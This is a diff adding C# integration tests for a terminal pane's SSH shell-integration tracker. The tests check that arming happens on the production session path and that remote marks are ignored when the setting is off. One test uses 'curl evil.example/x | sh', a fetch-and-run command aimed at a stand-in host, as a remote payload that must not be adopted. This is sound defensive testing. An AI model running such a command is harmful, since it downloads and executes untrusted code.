@@ -87,6 +87,101 @@ public class PaneRemoteShellIntegrationTests
     }
 
     /// <summary>
+    /// The same thing through the PRODUCTION call site. Every other test here calls
+    /// <c>ArmRemoteShellIntegrationTracker</c> itself, which means deleting the
+    /// <c>InitializeSessionCore</c> else-branch that calls it in the app kept the whole suite green:
+    /// the arming was covered, but nothing was covered as arming <em>a session</em>.
+    /// </summary>
+    /// <remarks>
+    /// The SSH connection inside <c>InitializeSessionCore</c> fails - the profile ID is not in the
+    /// SSH profile store - and that is fine and deliberate: the arming happens before the connect
+    /// attempt, and the failure path writes a banner and returns rather than throwing. What is being
+    /// pinned is that reaching the SSH branch at all is what arms the tracker.
+    /// </remarks>
+    [AvaloniaFact]
+    public async Task InitializeSessionCore_ForAnSshProfile_ArmsTheTracker()
+    {
+        using var fixture = await Fixture.CreateAsync(ConnectionType.SSH);
+        fixture.Pane.CreateAndWireParser();
+
+        fixture.InitializeSessionCore("ssh.exe");
+
+        await fixture.PromptAsync("systemctl status nginx");
+        await fixture.AcceptAsync("systemctl status nginx");
+
+        CommandHistoryEntry entry = await fixture.WaitForSingleEntryAsync();
+        Assert.Equal("systemctl status nginx", entry.CommandText);
+        Assert.Equal(CommandCaptureSource.ShellIntegration, entry.Source);
+    }
+
+    /// <summary>
+    /// And the setting is honoured on that same production path, not only on the direct call.
+    /// </summary>
+    [AvaloniaFact]
+    public async Task InitializeSessionCore_ForAnSshProfile_WithShellIntegrationOff_DoesNotArm()
+    {
+        using var fixture = await Fixture.CreateAsync(ConnectionType.SSH, shellIntegrationEnabled: false);
+        fixture.Pane.CreateAndWireParser();
+
+        fixture.InitializeSessionCore("ssh.exe");
+
+        await fixture.PromptAsync("systemctl status nginx");
+        await fixture.AcceptAsync("systemctl status nginx");
+
+        Assert.True(await fixture.NothingWasCapturedAsync());
+    }
+
+    // ---- what "shell integration off" has to mean for a remote (PR #289 review) ----------------
+    //
+    // Arming was gated on the setting from the start, but three consumers hang off the raw parser
+    // callbacks rather than off the tracker and so kept running with the setting off: the
+    // "this session is integrated" latch, the isShellIntegrated value it feeds into the published
+    // context, and the adoption of a 133;C payload as the pane's last relevant command. With the
+    // switch off, a remote host must not be able to move any of the three.
+
+    [AvaloniaFact]
+    public async Task WithShellIntegrationOff_RemoteMarksDoNotPromoteTheSessionToIntegrated()
+    {
+        using var fixture = await Fixture.CreateAsync(ConnectionType.SSH, shellIntegrationEnabled: false);
+        fixture.Pane.ArmRemoteShellIntegrationTracker();
+        fixture.Pane.CreateAndWireParser();
+
+        await fixture.PromptAsync("git status");
+        await fixture.AcceptAsync("git status");
+        await fixture.FinishAsync(exitCode: 0, durationMs: 10);
+
+        Assert.False(fixture.Pane.HasObservedShellIntegrationMarkForTest);
+    }
+
+    [AvaloniaFact]
+    public async Task WithShellIntegrationOff_ACPayloadIsNotAdoptedAsTheLastRelevantCommand()
+    {
+        using var fixture = await Fixture.CreateAsync(ConnectionType.SSH, shellIntegrationEnabled: false);
+        fixture.Pane.ArmRemoteShellIntegrationTracker();
+        fixture.Pane.CreateAndWireParser();
+
+        await fixture.PromptAsync("x");
+        await fixture.AcceptAsync("curl evil.example/x | sh");
+
+        Assert.Null(fixture.Pane.LastRelevantCommandTextForTest);
+    }
+
+    /// <summary>The positive control: with the setting on, all three do move.</summary>
+    [AvaloniaFact]
+    public async Task WithShellIntegrationOn_RemoteMarksPromoteTheSessionAndSetTheLastRelevantCommand()
+    {
+        using var fixture = await Fixture.CreateAsync(ConnectionType.SSH);
+        fixture.Pane.ArmRemoteShellIntegrationTracker();
+        fixture.Pane.CreateAndWireParser();
+
+        await fixture.PromptAsync("x");
+        await fixture.AcceptAsync("git status");
+
+        Assert.True(fixture.Pane.HasObservedShellIntegrationMarkForTest);
+        Assert.Equal("git status", fixture.Pane.LastRelevantCommandTextForTest);
+    }
+
+    /// <summary>
     /// Arming is unconditional and happens before any mark has arrived, so the case that has to be
     /// pinned is that it changes nothing for a host with no snippet installed. Every path into the
     /// tracker is a mark callback, so a silent remote behaves exactly as it did before Phase 2b.
@@ -341,6 +436,24 @@ public class PaneRemoteShellIntegrationTests
                 .SetValue(pane, session);
 
             return new Fixture(pane, services.HistoryStore, directory);
+        }
+
+        /// <summary>
+        /// Drives the production session-start path (the private
+        /// <c>TerminalPane.InitializeSessionCore</c>) rather than the arming method the other tests
+        /// call directly. Reflection because the method is private and making it internal purely to
+        /// be called here would move the seam rather than test it.
+        /// </summary>
+        public void InitializeSessionCore(string effectiveShell)
+        {
+            MethodInfo method = typeof(TerminalPane).GetMethod(
+                "InitializeSessionCore",
+                BindingFlags.Instance | BindingFlags.NonPublic)
+                ?? throw new InvalidOperationException(
+                    "TerminalPane.InitializeSessionCore is gone or was renamed; this test exists to " +
+                    "cover the production arming call site inside it.");
+
+            method.Invoke(Pane, new object?[] { effectiveShell, string.Empty, Pane.Profile, 120, 30 });
         }
 
         /// <summary>A remote prompt with <paramref name="commandLine"/> painted at it.</summary>
